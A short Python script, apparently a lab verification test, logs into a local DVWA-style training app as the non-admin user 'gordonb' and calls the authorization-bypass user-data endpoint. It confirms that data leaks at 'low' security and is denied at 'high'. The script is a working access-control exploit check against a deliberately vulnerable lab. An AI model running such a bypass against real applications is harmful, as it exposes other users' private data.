import requests,re
s=requests.Session();b='http://127.0.0.1:8088'
r=s.get(b+'/login.php');t=re.search("name='user_token' value='([^']+)'",r.text)[1]
r=s.post(b+'/login.php',data={'username':'gordonb','password':'abc123','Login':'Login','user_token':t})
assert 'login.php' not in r.url
print('Usuario autenticado: gordonb (no administrador)')
for level in ['low','high']:
 s.cookies.set('security',level,domain='127.0.0.1',path='/')
 r=s.get(b+'/vulnerabilities/authbypass/get_user_data.php')
 print('Nivel',level,'HTTP',r.status_code,'Respuesta:',r.text)
 data=r.json()
 assert (isinstance(data,list) and len(data)==5) if level=='low' else data.get('error')=='Access denied'
print('PASS: acceso indebido confirmado en low y denegado en high')
